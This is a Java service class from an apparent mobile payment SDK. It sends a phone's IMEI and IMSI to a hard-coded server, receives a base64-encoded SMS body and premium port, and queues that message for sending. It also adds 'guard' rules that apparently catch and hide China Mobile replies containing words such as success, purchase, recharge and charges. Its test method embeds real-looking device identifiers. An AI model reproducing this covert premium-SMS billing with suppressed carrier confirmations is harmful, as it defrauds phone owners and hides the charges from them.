package com.jxt.pay.appclient.service.dynamic.net;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

/**
 * http://182.50.1.61:8808/interfaces/getsms_mm_feiji.php?price=200&imei=867006010162492&imsi=460026764508764&channelid=3100008&cpparam=LSHOU764508764
 * @author leoliu
 *
 */
public class XmwtMm7DynamicService implements IDynamicService{

	private static final String TYPE = "xmwtMm7";
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final String REQUESTMODEL = "price={price}&imei={imei}&imsi={imsi}&channelid={channelid}&cpparam={cpparam}{channel}";
	
	private static final Guard guard1 = new Guard("10658800","成功|购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();

	private int timeOut = 60;
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String channelid = map.get("channelid");
			String price = map.get("price");
			String cpparam = map.get("cpparam");
			String imei = map.get("imei");
			String imsi = map.get("imsi");
			
			String param = REQUESTMODEL.replace("{channelid}",channelid).replace("{price}",price).replace("{cpparam}",cpparam).replace("{channel}",channel).replace("{imei}",imei).replace("{imsi}",imsi);
			
			String responseJson = GetData.getData(url, param);
			
			xml = parse(responseJson);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(10,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parse(String responseJson){
		
		if(responseJson != null && responseJson.length() > 10){
			
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String status = jo.getString("status");
				
				if("0".equals(status)){
					List<Sms> smsList = new ArrayList<Sms>();
					
					Sms sms = new Sms();
					
					sms.setSmsContent(CommonUtil.base64Decode(jo.getString("smsmsg")));
					sms.setSmsDest(jo.getString("smsport"));
					sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					
					smsList.add(sms);
					
					Sms guardSms = new Sms();
					
					List<Guard> guardList = new ArrayList<Guard>();
					
					guardList.add(guard1);
					guardList.add(guard2);
					
					guardList.add(guard3);
					guardList.add(guard4);
					
					guardSms.setGuardList(guardList);
					
					smsList.add(0, guardSms);
						
					return XstreamHelper.toXml(smsList);
					
				}
				
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		test1();
	}
	
	/**
	 * http://182.50.1.61:8808/interfaces/getsms_mm_feiji.php?price=200&imei=867006010162492&imsi=460026764508764&channelid=3100008&cpparam=LSHOU764508764
	 */
	private static void test1(){
		String url = "http://182.50.1.61:8808/interfaces/getsms_mm_longchengnvwang.php";
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", url);
		map.put("type", "xmwtMm7");
		map.put("channel", "10B101a87654322");
		map.put("channelid", "3100004");
		map.put("price", "1000");
		map.put("cpparam", "LONGCHENGNVWANG1000YUNJIshjy");
		map.put("imei","862949029214504");
		map.put("imsi", "460022101441340");
		
		System.out.println(new XmwtMm7DynamicService().dynamic(map));
	}

}
